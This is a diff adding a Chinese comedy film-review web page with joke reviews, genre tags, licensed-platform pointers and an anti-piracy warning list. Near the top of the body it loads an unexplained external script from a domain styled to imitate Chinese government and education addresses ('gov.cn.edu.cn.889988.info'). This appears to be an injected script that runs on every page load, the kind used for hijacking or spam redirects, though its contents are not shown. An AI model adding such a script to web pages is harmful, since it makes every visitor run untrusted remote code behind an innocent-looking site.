@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>lool电影网 - 搞笑影评、片单吐槽与正版观影导航</title>
+<meta name="description" content="lool电影网用轻松弹幕风讲电影：搞笑影评、神吐槽片单、类型导航、正版平台与防盗版提醒，移动端自适应，不提供盗版资源。">
+<meta name="keywords" content="lool电影网,搞笑影评,电影吐槽,电影片单,正版观影,影视导航">
+<meta name="author" content="lool电影网">
+<link rel="canonical" href="https://loldianyingwang-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#0c0f07;color:#eaf7d8;line-height:1.75}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+
+/* 导航 */
+.nav{position:sticky;top:0;z-index:99;background:rgba(12,15,7,.9);backdrop-filter:blur(8px);border-bottom:1px solid #2c3a17}
+.nav__box{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.8rem 1rem;flex-wrap:wrap;gap:.5rem}
+.nav__logo{font-weight:900;font-size:1.25rem;color:#c6ff3a}
+.nav__logo b{color:#fff}
+.nav__links{display:flex;gap:.3rem;flex-wrap:wrap}
+.nav__links a{padding:.4rem .8rem;border-radius:999px;font-size:.86rem;color:#a9c97a}
+.nav__links a:hover{background:#1c2610;color:#c6ff3a}
+
+/* Hero */
+.hero{max-width:1200px;margin:2rem auto;padding:0 1rem}
+.hero__card{border-radius:26px;overflow:hidden;background:
+  radial-gradient(circle at 85% 10%,rgba(198,255,58,.22),transparent 55%),
+  linear-gradient(135deg,#101403,#26330f 55%,#3c5212);
+  display:grid;grid-template-columns:1.3fr .7fr}
+.hero__left{padding:3rem 2rem}
+.hero__tag{display:inline-block;font-size:.74rem;letter-spacing:2px;color:#c6ff3a;border:1px solid #6f8f24;padding:.2rem .8rem;border-radius:999px;margin-bottom:1rem}
+.hero h1{font-size:clamp(2rem,5vw,3.2rem);line-height:1.15;margin-bottom:1rem}
+.hero h1 em{font-style:normal;color:#c6ff3a}
+.hero p{color:#c4d99a;max-width:560px;margin-bottom:1.6rem}
+.hero__btn{display:inline-block;background:#c6ff3a;color:#101403;font-weight:800;padding:.8rem 2rem;border-radius:999px}
+.hero__right{display:flex;align-items:center;justify-content:center;font-size:6.5rem}
+
+/* 弹幕条 */
+.danmu{overflow:hidden;white-space:nowrap;background:#101403;border-top:1px solid #2c3a17;border-bottom:1px solid #2c3a17;padding:.6rem 0;color:#9fc56a;font-size:.9rem}
+.danmu span{display:inline-block;padding-left:100%;animation:scroll 18s linear infinite}
+@keyframes scroll{from{transform:translateX(0)}to{transform:translateX(-100%)}}
+
+/* 通用 */
+.wrap{max-width:1200px;margin:3.5rem auto;padding:0 1rem}
+.head{display:flex;align-items:baseline;gap:1rem;margin-bottom:1.5rem}
+.head h2{font-size:1.6rem}
+.head h2 span{color:#c6ff3a}
+.head a{margin-left:auto;color:#a9c97a;font-size:.85rem}
+
+/* 栏目1：搞笑影评 卡片 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.2rem}
+.card{background:#121804;border:1px solid #2c3a17;border-radius:18px;padding:1.2rem;transition:.3s}
+.card:hover{transform:translateY(-6px);border-color:#c6ff3a;box-shadow:0 18px 40px rgba(198,255,58,.15)}
+.card__emo{font-size:2rem}
+.card h3{font-size:1rem;margin:.4rem 0}
+.card p{font-size:.84rem;color:#a9c97a}
+
+/* 栏目2：神吐槽片单 左右 */
+.roast{display:grid;grid-template-columns:1.1fr .9fr;gap:1.5rem}
+.roast__big{border-radius:20px;min-height:340px;color:#101403;background:linear-gradient(135deg,#c6ff3a,#7fae1f);padding:2rem;display:flex;align-items:flex-end}
+.roast__big h3{font-size:1.7rem;margin-bottom:.4rem}
+.roast__big p{color:#1c2607}
+.roast__list{display:flex;flex-direction:column;gap:.8rem}
+.roast__row{background:#121804;border:1px solid #2c3a17;border-radius:14px;padding:.8rem .9rem}
+.roast__row h4{font-size:.95rem;color:#eaf7d8}
+.roast__row small{color:#9fc56a}
+
+/* 栏目3：类型导航 标签 */
+.tags{display:flex;flex-wrap:wrap;gap:.8rem}
+.chip{padding:.7rem 1.1rem;border-radius:14px;font-weight:700;color:#101403;background:#c6ff3a}
+.chip small{display:block;font-weight:400;opacity:.7;font-size:.74rem}
+
+/* 栏目4：正版平台 步骤 */
+.steps{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1.2rem}
+.step{background:#121804;border:1px solid #2c3a17;border-radius:16px;padding:1.3rem}
+.step__no{font-size:2rem;font-weight:900;color:#7fae1f}
+.step h4{margin:.3rem 0;color:#c6ff3a}
+.step p{font-size:.86rem;color:#c4d99a}
+
+/* 栏目5：防盗版 */
+.warn{background:#1a210a;border:1px dashed #c6ff3a;border-radius:18px;padding:1.4rem 1.6rem}
+.warn h3{color:#c6ff3a;margin-bottom:.6rem}
+.warn ul{margin-left:1.2rem;color:#c4d99a;font-size:.9rem}
+.warn li{margin:.3rem 0}
+
+/* 页脚 */
+.foot{margin-top:4rem;background:#060803;color:#a9c97a;text-align:center;padding:2.5rem 1rem;border-top:1px solid #2c3a17}
+.foot b{color:#fff}
+.foot a{color:#c6ff3a;margin:0 .4rem}
+.foot small{display:block;margin-top:.8rem;color:#6f8f24}
+
+@media(max-width:880px){
+  .hero__card{grid-template-columns:1fr}
+  .hero__right{min-height:140px;font-size:4.5rem}
+  .roast{grid-template-columns:1fr}
+}
+@media(max-width:560px){
+  .nav__box{justify-content:center}
+  .head h2{font-size:1.3rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="nav">
+  <div class="nav__box">
+    <div class="nav__logo">lool<b>电影网</b></div>
+    <nav class="nav__links">
+      <a href="#review">搞笑影评</a>
+      <a href="#roast">神吐槽片单</a>
+      <a href="#type">类型导航</a>
+      <a href="#plat">正版平台</a>
+      <a href="#safe">防盗版</a>
+    </nav>
+  </div>
+</header>
+
+<div class="danmu"><span>“男主跑了三集还没解释为什么” ｜ “反派逻辑比编剧还累” ｜ “这转场像我PPT” ｜ “哭点很土但土到我了” ｜ “续集别来了求你们了”</span></div>
+
+<section class="hero">
+  <div class="hero__card">
+    <div class="hero__left">
+      <span class="hero__tag">LOL MOVIE / 弹幕影评站</span>
+      <h1>lool电影网<br><em>不装深刻，先把电影聊乐</em></h1>
+      <p>lool电影网用弹幕味讲片：搞笑影评、神吐槽片单、类型导航、正版平台入口、防盗版提醒。不提供盗版播放、不装破解播放器、不引网盘资源。</p>
+      <a href="#review" class="hero__btn">看吐槽 ›</a>
+    </div>
+    <div class="hero__right">😂</div>
+  </div>
+</section>
+
+<section class="wrap" id="review">
+  <div class="head"><h2>搞笑<span>影评</span></h2><a href="#">更多 ›</a></div>
+  <div class="grid">
+    <article class="card"><div class="card__emo">🤡</div><h3>《男主失忆100次》</h3><p>观众没忘，编剧先忘了。</p></article>
+    <article class="card"><div class="card__emo">🚪</div><h3>《门开了但没人进》</h3><p>悬疑片最悬的事：预算。</p></article>
+    <article class="card"><div class="card__emo">💔</div><h3>《分手在第三分钟》</h3><p>剩下的110分钟都在后悔。</p></article>
+    <article class="card"><div class="card__emo">🤖</div><h3>《AI拯救世界》</h3><p>先拯救一下台词行吗。</p></article>
+    <article class="card"><div class="card__emo">🍜</div><h3>《吃饭戏太长》</h3><p>主角吃面，我吃外卖，挺平等。</p></article>
+    <article class="card"><div class="card__emo">🎓</div><h3>《结局装深刻》</h3><p>字幕一黑，观众：就这？</p></article>
+  </div>
+</section>
+
+<section class="wrap" id="roast">
+  <div class="head"><h2>神吐槽<span>片单</span></h2><a href="#">更多 ›</a></div>
+  <div class="roast">
+    <article class="roast__big">
+      <div>
+        <h3>“名场面但离谱”合集</h3>
+        <p>雨中吵架不淋湿、电话永远不断线、反派一定要说完遗言。</p>
+      </div>
+    </article>
+    <div class="roast__list">
+      <div class="roast__row"><h4>开局就结婚，中间就出轨</h4><small>家庭伦理速食包</small></div>
+      <div class="roast__row"><h4>反派有钱有脑，最后突然降智</h4><small>编剧保命套路</small></div>
+      <div class="roast__row"><h4>主角摔一跤捡到秘籍</h4><small>运气型成长线</small></div>
+      <div class="roast__row"><h4>结尾突然唱主题曲</h4><small>情绪不够，音乐来凑</small></div>
+    </div>
+  </div>
+</section>
+
+<section class="wrap" id="type">
+  <div class="head"><h2>按心情<span>找片</span></h2><a href="#">更多 ›</a></div>
+  <div class="tags">
+    <div class="chip">解压喜剧<small>别动脑</small></div>
+    <div class="chip">烂片考古<small>越烂越香</small></div>
+    <div class="chip">哭得出来<small>情绪充值</small></div>
+    <div class="chip">烧脑悬疑<small>别玩手机</small></div>
+    <div class="chip">合家欢<small>娃不闹</small></div>
+    <div class="chip">社恐治愈<small>一个人看</small></div>
+    <div class="chip">低成本神作<small>穷得高级</small></div>
+    <div class="chip">续集劝退<small>别被骗</small></div>
+  </div>
+</section>
+
+<section class="wrap" id="plat">
+  <div class="head"><h2>正版<span>去哪看</span></h2><a href="#">更多 ›</a></div>
+  <div class="steps">
+    <div class="step"><div class="step__no">01</div><h4>主流平台免费层</h4><p>广告版/限免/首月试用，比无名聚合站稳。</p></div>
+    <div class="step"><div class="step__no">02</div><h4>公共文化平台</h4><p>公版电影、纪录片、老动画，真免费。</p></div>
+    <div class="step"><div class="step__no">03</div><h4>官方APP/电视台</h4><p>正版授权、回看、重映都算数。</p></div>
+    <div class="step"><div class="step__no">04</div><h4>影展/租片平台</h4><p>独立片、外语片、修复版更全。</p></div>
+  </div>
+</section>
+
+<section class="wrap" id="safe">
+  <div class="head"><h2>防盗版<span>避雷</span></h2><a href="#">更多 ›</a></div>
+  <div class="warn">
+    <h3>⚠️ lool 式提醒：这些“免费看”别信</h3>
+    <ul>
+      <li>院线刚上就能看高清完整版 → 侵权/录屏/诈骗</li>
+      <li>“专用播放器/破解APP/关杀毒” → 高危</li>
+      <li>“网盘解压码+加群拿资源” → 灰产引流</li>
+      <li>满屏立即播放还跳博彩 → 别点，直接关</li>
+      <li>静态页聚合盗版视频 → 托管平台也会下架</li>
+    </ul>
+  </div>
+</section>
+
+<footer class="foot">
+  <div><b>lool电影网</b> · 搞笑影评 / 神吐槽片单 / 类型导航 / 正版平台</div>
+  <div style="margin-top:.6rem">
+    <a href="#review">搞笑影评</a>|
+    <a href="#roast">神吐槽</a>|
+    <a href="#type">类型导航</a>|
+    <a href="#plat">正版平台</a>|
+    <a href="#safe">防盗版</a>|
+    <a href="#">关于</a>|
+    <a href="#">免责声明</a>
+  </div>
+  <small>官网：https://loldianyingwang-h5.github.io</small>
+  <small>© 2025 lool电影网 仅做影视吐槽与正版导航，不提供侵权影视资源</small>
+</footer>
+
+</body>
+</html>
